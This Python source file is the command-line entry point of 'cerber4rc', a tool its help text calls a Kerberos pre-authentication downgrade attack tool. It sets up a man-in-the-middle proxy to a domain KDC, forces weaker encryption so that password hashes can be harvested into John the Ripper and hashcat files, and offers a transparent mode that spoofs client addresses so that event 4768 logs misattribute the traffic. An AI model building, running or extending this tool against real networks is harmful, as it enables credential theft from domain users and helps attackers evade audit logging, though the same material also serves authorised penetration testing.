from __future__ import annotations

import os
import signal
import subprocess
from datetime import datetime
from pathlib import Path
from types import FrameType

import typer

from .config import Config, Mode
from .engine import Engine
from .output import Output
from .proxy import Proxy, TransparentUnavailable
from .state import Registry

app = typer.Typer(
    name="cerber4rc",
    help="Kerberos pre-authentication downgrade attack tool",
    add_completion=False,
    pretty_exceptions_enable=False,
    no_args_is_help=True,
)

TPROXY_MARK = 1
TPROXY_TABLE = 100


def _ip(*args: str) -> str:
    try:
        return subprocess.run(
            ["ip", *args], capture_output=True, text=True, timeout=5, check=False
        ).stdout
    except (OSError, subprocess.SubprocessError):
        return ""


def _ip_forward() -> str:
    try:
        return Path("/proc/sys/net/ipv4/ip_forward").read_text().strip()
    except OSError:
        return "1"


def transparent_plumbing_problems() -> list[str]:
    problems: list[str] = []

    if _ip_forward() != "1":
        problems.append(
            "IPv4 forwarding is off; relayed traffic is silently dropped.\n"
            "    sudo sysctl -w net.ipv4.ip_forward=1"
        )

    rules = _ip("rule", "show")
    if (
        rules
        and f"fwmark {TPROXY_MARK} " not in rules
        and f"fwmark {TPROXY_MARK:#x} " not in rules
    ):
        problems.append(
            f"no routing rule for fwmark {TPROXY_MARK}; marked packets never reach "
            f"table {TPROXY_TABLE}.\n"
            f"    sudo ip rule add fwmark {TPROXY_MARK} lookup {TPROXY_TABLE}"
        )

    routes = _ip("route", "show", "table", str(TPROXY_TABLE))
    if "local default" not in routes and "local 0.0.0.0/0" not in routes:
        problems.append(
            f"table {TPROXY_TABLE} has no local route, so the KDC's replies are "
            "forwarded to the real client instead of to this proxy.\n"
            "    THIS IS THE USUAL CAUSE OF A HUNG RETURN PATH.\n"
            f"    sudo ip route add local 0.0.0.0/0 dev lo table {TPROXY_TABLE}"
        )

    return problems


def resolve_hash_prefix(value: str | None) -> Path:
    default_name = datetime.now().strftime("%Y_%m_%d-%H_%M_%S") + "-hashes"
    if value is None:
        return Path(default_name)
    target = Path(value)
    if value.endswith(os.sep) or target.is_dir():
        return target / default_name
    return target


@app.command()
def main(
    kdc_host: str = typer.Option(
        ..., "--kdc-host", "-k", help="Kerberos KDC IP address"
    ),
    listen_host: str = typer.Option(
        "0.0.0.0", "--listen-host", "-l", help="IP address to listen on"
    ),
    listen_port: int = typer.Option(
        8888, "--listen-port", "-p", min=1, max=65535, help="Port to listen on"
    ),
    kdc_port: int = typer.Option(
        88, "--kdc-port", min=1, max=65535, help="Kerberos KDC port"
    ),
    relay: bool = typer.Option(
        False,
        "--relay",
        "-r",
        help="Passive mode: observe and capture only, no rewriting",
    ),
    hash_prefix: str | None = typer.Option(
        None,
        "--hash-logfile",
        "-o",
        help="Prefix for the captured-hash files (<prefix>_john / <prefix>_hashcat). "
        "An existing directory is also accepted, and timestamped files are placed inside it",
    ),
    verbose: bool = typer.Option(False, "--verbose", "-v", help="Enable debug output"),
    keep_downgrading: bool = typer.Option(
        False,
        "--keep-downgrading",
        help="Keep downgrading a principal after a hash is verified valid, instead of "
        "going quiet after the first good capture",
    ),
    machines: bool = typer.Option(
        False,
        "--machines",
        help="Also target machine accounts (cname ending in '$'). By default they are "
        "detected and passed through untouched -- their password is uncrackable regardless "
        "of etype, so nothing is captured for them",
    ),
    transparent: bool = typer.Option(
        False,
        "--transparent",
        help="Carry the client's own source IP and port on the connection to the KDC, so "
        "event 4768 records the client instead of this host. Needs CAP_NET_ADMIN (sudo, or "
        "setcap on the interpreter) plus the tproxy plumbing described in the README; the "
        "destination is then taken from the accepted socket rather than --kdc-host",
    ),
) -> None:
    """Meddles with Kerberos pre-authentication messages to harvest hashes."""
    if transparent:
        problems = transparent_plumbing_problems()
        if problems:
            typer.echo(
                "--transparent is missing kernel plumbing. nftables alone is not "
                "enough:\n",
                err=True,
            )
            for problem in problems:
                typer.echo(f"  * {problem}\n", err=True)
            typer.echo(
                "See the transparent-mode setup section of the README for the full "
                "sequence, including the nft ruleset.",
                err=True,
            )
            raise typer.Exit(code=1)

    target = resolve_hash_prefix(hash_prefix)
    hash_prefix = str(target)
    parent = target.parent
    try:
        parent.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        typer.echo(
            f"cannot create directory for --hash-logfile ({parent}): {exc}", err=True
        )
        raise typer.Exit(code=1) from exc

    if not os.access(parent, os.W_OK | os.X_OK):
        typer.echo(
            f"cannot write hash files into {parent.resolve()}: permission denied.\n"
            "Pick a writable --hash-logfile prefix, or fix the directory's permissions.",
            err=True,
        )
        raise typer.Exit(code=1)

    config = Config(
        listen_host=listen_host,
        listen_port=listen_port,
        kdc_host=kdc_host,
        kdc_port=kdc_port,
        mode=Mode.PASSIVE if relay else Mode.ACTIVE,
        hash_prefix=hash_prefix,
        keep_downgrading=keep_downgrading,
        machines=machines,
        transparent=transparent,
    )
    output = Output(hash_prefix=config.hash_prefix, verbose=verbose)
    engine = Engine(config=config, registry=Registry())
    proxy = Proxy(config=config, engine=engine, output=output)

    def _handle_signal(signum: int, frame: FrameType | None) -> None:
        output.event("shutdown requested")
        proxy.stop()

    signal.signal(signal.SIGINT, _handle_signal)
    signal.signal(signal.SIGTERM, _handle_signal)

    try:
        proxy.serve_forever()
    except TransparentUnavailable as exc:
        typer.echo(str(exc), err=True)
        raise typer.Exit(code=1) from exc
    except OSError as exc:
        output.event(f"[red]failed to bind {listen_host}:{listen_port}: {exc}[/red]")
        raise typer.Exit(code=1) from exc
    except KeyboardInterrupt:
        output.event("shutdown requested")
    finally:
        proxy.stop()
        if proxy.served:
            output.flush_pending()
            output.summary()


def run() -> None:
    app()


if __name__ == "__main__":
    app()
